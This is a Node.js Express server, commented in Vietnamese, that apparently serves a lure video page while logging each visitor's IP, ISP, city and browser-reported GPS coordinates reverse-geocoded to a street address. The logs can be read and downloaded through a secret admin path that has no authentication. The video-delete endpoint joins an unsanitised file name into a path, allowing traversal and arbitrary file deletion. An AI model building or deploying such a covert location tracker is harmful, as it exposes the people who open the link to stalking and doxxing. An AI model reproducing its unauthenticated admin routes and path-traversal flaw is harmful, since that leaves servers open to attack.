// ==========================================================
// PHẦN 1: IMPORTS VÀ CẤU HÌNH BAN ĐẦU
// ==========================================================
import express from "express";
import fetch from "node-fetch";
import { promises as fs } from "fs";
import path from "path";
import { fileURLToPath } from "url";
import dotenv from "dotenv";
import multer from "multer";

// --- Cấu hình Biến môi trường ---
if (process.env.NODE_ENV !== "production") {
  const __filename_temp = fileURLToPath(import.meta.url);
  const __dirname_temp = path.dirname(__filename_temp);
  dotenv.config({ path: path.join(__dirname_temp, ".env") });
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_SECRET_PATH = process.env.ADMIN_SECRET_PATH;

// --- Cấu hình Multer ---
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const destPath = path.join(__dirname, "public", "videos");
    fs.mkdir(destPath, { recursive: true })
      .then(() => cb(null, destPath))
      .catch((err) => cb(err));
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    cb(null, uniqueSuffix + path.extname(file.originalname));
  },
});
const upload = multer({ storage: storage });

// ==========================================================
// PHẦN 2: MIDDLEWARES
// ==========================================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// ==========================================================
// PHẦN 3: ROUTES VÀ API
// ==========================================================

// --- API CÔNG KHAI ---
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/api/log-ip-location", async (req, res) => {
  const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const timestamp = new Date().toLocaleString("vi-VN", {
    timeZone: "Asia/Ho_Chi_Minh",
  });
  let locationInfo = `[${timestamp}] User IP: ${userIP}\n  Location: (Unknown or Local IP)\n  ISP: N/A`;
  try {
    if (userIP && !userIP.includes("127.0.0.1") && !userIP.includes("::1")) {
      const response = await fetch(
        `http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp`
      );
      const apiData = await response.json();
      if (apiData.status !== "fail") {
        locationInfo = `[${timestamp}] User IP: ${userIP}\n  Estimated Location: ${apiData.city}, ${apiData.regionName}, ${apiData.country}\n  ISP: ${apiData.isp}`;
      }
    }
  } catch (error) {
    console.error("Could not connect to ip-api.com:", error.message);
  }
  try {
    await fs.appendFile(
      path.join(__dirname, "ip_logs.txt"),
      `\n${locationInfo}\n`,
      "utf8"
    );
    res.status(200).json({ message: "IP location log attempted" });
  } catch (fileError) {
    console.error("Error writing IP log:", fileError);
    res.status(500).json({ message: "Failed to write to log file" });
  }
});

app.post("/api/log-precise-location", async (req, res) => {
  try {
    const { latitude, longitude } = req.body;
    const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const geoResponse = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`,
      { headers: { "User-Agent": "PreciseLogger/1.0" } }
    );
    const geoData = await geoResponse.json();
    const detailedAddress = geoData.display_name || "N/A";
    const timestamp = new Date().toLocaleString("vi-VN", {
      timeZone: "Asia/Ho_Chi_Minh",
    });
    const logData = `\n[${timestamp}] User IP: ${userIP}\n  Precise Coords: Latitude: ${latitude}, Longitude: ${longitude}\n  Detailed Address: ${detailedAddress}\n`;
    await fs.appendFile(
      path.join(__dirname, "precise_logs.txt"),
      logData,
      "utf8"
    );
    res.status(200).json({ message: "Precise location logged successfully" });
  } catch (error) {
    console.error("Error logging precise location:", error);
    res.status(500).json({ message: "Internal Server Error" });
  }
});

app.get("/api/active-video", async (req, res) => {
  const configPath = path.join(__dirname, "data", "config.json");
  try {
    await fs.access(configPath);
    const fileContents = await fs.readFile(configPath, "utf8");
    const config = JSON.parse(fileContents);
    res.json({ url: config.activeVideo });
  } catch {
    res.status(200).json({ url: "" });
  }
});

// --- ROUTER ADMIN BÍ MẬT ---
if (ADMIN_SECRET_PATH) {
  const adminRouter = express.Router();

  // --- Các trang của Admin ---
  adminRouter.get("/dashboard", (req, res) =>
    res.sendFile(path.join(__dirname, "public", "dashboard.html"))
  );
  adminRouter.get("/videos", (req, res) =>
    res.sendFile(path.join(__dirname, "public", "videos-manager.html"))
  );

  // --- Các API của Admin ---
  adminRouter.get("/api/logs/:logType", async (req, res) => {
    const { logType } = req.params;
    if (!["ip", "precise"].includes(logType))
      return res.status(400).send("Loại log không hợp lệ.");
    const fileName = `${logType}_logs.txt`;
    const logFilePath = path.join(__dirname, fileName);
    try {
      await fs.access(logFilePath);
      res.type("text/plain").sendFile(logFilePath);
    } catch {
      res.send(`File log '${fileName}' chưa được tạo hoặc trống.`);
    }
  });

  adminRouter.get("/api/download/:logType", async (req, res) => {
    const { logType } = req.params;
    if (!["ip", "precise"].includes(logType))
      return res.status(400).send("Loại log không hợp lệ.");
    const fileName = `${logType}_logs.txt`;
    const logFilePath = path.join(__dirname, fileName);
    try {
      await fs.access(logFilePath);
      res.download(logFilePath);
    } catch {
      res.status(404).send(`File log '${fileName}' không tồn tại để tải.`);
    }
  });

  adminRouter.post("/api/clear-logs/:logType", async (req, res) => {
    const { logType } = req.params;
    if (!["ip", "precise"].includes(logType))
      return res.status(400).json({ message: "Loại log không hợp lệ." });
    const fileName = `${logType}_logs.txt`;
    const logFilePath = path.join(__dirname, fileName);
    try {
      await fs.unlink(logFilePath);
      res
        .status(200)
        .json({ message: `File log '${fileName}' đã được xóa thành công.` });
    } catch (err) {
      if (err.code === "ENOENT") {
        return res
          .status(200)
          .json({ message: `File log '${fileName}' không tồn tại.` });
      }
      res
        .status(500)
        .json({ message: "Không thể xóa file log do lỗi server." });
    }
  });

  adminRouter.post(
    "/api/videos/upload",
    upload.single("videoFile"),
    (req, res) => {
      if (!req.file) {
        return res
          .status(400)
          .json({ message: "Vui lòng chọn một file để upload." });
      }
      res
        .status(200)
        .json({
          message: `File '${req.file.filename}' đã được upload thành công.`,
        });
    }
  );

  adminRouter.get("/api/videos", async (req, res) => {
    const videosDirectory = path.join(__dirname, "public", "videos");
    try {
      await fs.mkdir(videosDirectory, { recursive: true });
      const fileNames = await fs.readdir(videosDirectory);
      res.json(fileNames);
    } catch {
      res.status(500).json({ error: "Không thể lấy danh sách video" });
    }
  });

  adminRouter.post("/api/videos/set-active", async (req, res) => {
    const { fileName } = req.body;
    if (!fileName)
      return res.status(400).json({ error: "Tên file là bắt buộc" });
    try {
      const configDir = path.join(__dirname, "data");
      const configPath = path.join(configDir, "config.json");
      const newConfig = { activeVideo: `/videos/${fileName}` };
      await fs.mkdir(configDir, { recursive: true });
      await fs.writeFile(configPath, JSON.stringify(newConfig, null, 2));
      res.json({ message: `Đã đặt ${fileName} làm video chính.` });
    } catch (error) {
      res.status(500).json({ error: "Lỗi khi đặt video chính" });
    }
  });

  adminRouter.post("/api/videos/delete", async (req, res) => {
    const { fileName } = req.body;
    if (!fileName)
      return res.status(400).json({ error: "Tên file là bắt buộc" });
    try {
      const filePath = path.join(__dirname, "public", "videos", fileName);
      await fs.unlink(filePath);
      const configDir = path.join(__dirname, "data");
      const configPath = path.join(configDir, "config.json");
      try {
        const fileContents = await fs.readFile(configPath, "utf8");
        const config = JSON.parse(fileContents);
        if (config.activeVideo === `/videos/${fileName}`) {
          const newConfig = { activeVideo: "" };
          await fs.writeFile(configPath, JSON.stringify(newConfig, null, 2));
        }
      } catch {}
      res.json({ message: `Đã xóa video '${fileName}' thành công.` });
    } catch (error) {
      res.status(500).json({ error: `Không thể xóa video '${fileName}'.` });
    }
  });

  // Gắn router vào đường dẫn bí mật
  app.use(`/${ADMIN_SECRET_PATH}`, adminRouter);
}

// ==========================================================
// PHẦN 4: KHỞI ĐỘNG SERVER
// ==========================================================
app.listen(PORT, () => {
  console.log(`Server đang chạy tại http://localhost:${PORT}`);
  if (!ADMIN_SECRET_PATH) {
    console.warn("CẢNH BÁO: ADMIN_SECRET_PATH chưa được thiết lập!");
  } else {
    console.log(
      `Truy cập trang admin dashboard tại: /${ADMIN_SECRET_PATH}/dashboard`
    );
    console.log(
      `Truy cập trang quản lý video tại: /${ADMIN_SECRET_PATH}/videos`
    );
  }
});
